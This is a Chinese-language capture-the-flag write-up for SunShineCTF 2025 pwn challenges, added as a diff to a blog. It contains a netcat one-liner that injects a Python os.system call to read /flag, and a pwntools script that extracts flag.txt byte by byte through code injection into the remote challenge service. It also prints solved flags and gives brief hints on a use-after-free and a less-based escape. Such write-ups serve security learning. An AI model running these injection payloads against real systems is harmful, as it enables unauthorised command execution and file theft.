@@ -1,0 +1,68 @@
+export const layout = "#components/Page.js";
+export const title = "SunShineCTF 2025 Writeup";
+export const description = "2025 SunShineCTF Pwn 题解";
+export const created = "2025-09-29T17:54:39+08:00";
+
+# SunShineCTF 2025 Writeup
+
+小众变态比赛，没有正常 pwn 题了（（
+
+
+<img src="https://pic1.imgdb.cn/item/68da5854c5157e1a884583fd.png" width="60%" />
+
+
+## AstroJIT AI
+
+题目只给了远程靶机，没有 bin，连上去大概是个模型训练的工具，太神秘了
+
+题目描述里有提到这玩意是 JIT 的，问了问 ai 尝试了一下命令注入：
+
+`printf "\n1\n{__import__('os').system('cat /flag')}\n" | nc chal.sunshinectf.games 25006` 直接爆红了，那很对劲了，应该就是命令注入
+
+可以逐字节爆破 flag.txt：
+
+```python
+from pwn import *
+from sys import argv
+context.log_level = "info"
+
+
+def leak_one(cnt):
+    io = remote("chal.sunshinectf.games", 25006)
+    io.sendlineafter(b"mode:", b"\n")
+    io.sendlineafter(b"Enter an option:", b"1")
+    pay = "{(int)System.IO.File.ReadAllText(\"flag.txt\")[" + str(cnt) + "]}"
+    io.sendlineafter(b":", pay.encode())
+    io.sendlineafter(b"Enter an option:", b"4")
+
+    io.recvuntil(b"a uses weight")
+    res = int(io.recvuntil(b"\r\n", drop=True), 10)
+    return chr(res)
+
+
+idx = 0
+flag = ""
+while True:
+    flag += leak_one(idx)
+    idx = idx + 1
+    log.success(flag)
+```
+
+爆了 3 个小时多，flag 有 150 字节，无敌了。
+
+
+## HeapX
+
+白给的 UAF：![](https://pic1.imgdb.cn/item/68da59dcc5157e1a88458cef.png)
+
+随便打了
+
+`sun{pr!ntf_1n7ernAls_4rE_pr3tty_c0ol!}`
+
+## Space Is Less Than Ideal
+
+题目描述里有一句 `Well you know the expression. Less is more!`，连上去也给了一个能用 less 查看日志的终端。
+
+应该就是用 less 绕过
+
+`sun{less-is-more-no-really-it-is-just-a-symbolic-link}`
